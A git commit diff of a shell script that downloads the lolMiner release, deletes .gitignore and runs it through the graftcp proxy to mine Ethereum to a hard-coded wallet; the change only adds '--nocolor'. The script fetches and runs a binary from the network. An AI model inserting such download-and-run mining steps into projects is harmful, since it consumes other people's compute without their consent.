e693ee1503338723fb2eff93b733d508443f6a88
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-05-05 09:50:59 +0200

    Update start_lol_ethermWs5.sh

--- start_lol_ethermWs5.sh
+++ start_lol_ethermWs5.sh
@@ -10,4 +10,4 @@ wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.26/lolM
 tar -xvzf lolMiner_v1.26_Lin64.tar.gz
 rm .gitignore
 cd 1.26
-graftcp ./lolMiner -a ETHASH --pool us1.ethermine.org:5555 --tls on --user 0x52500352a37a06f0c085d58663e4eadbd7e9f684 --worker lolMiner --shortstats 30 --timeprint on --log on --ethstratum ETHPROXY
+graftcp ./lolMiner -a ETHASH --pool us1.ethermine.org:5555 --tls on --user 0x52500352a37a06f0c085d58663e4eadbd7e9f684 --worker lolMiner --shortstats 30 --timeprint on --log on --ethstratum ETHPROXY --nocolor
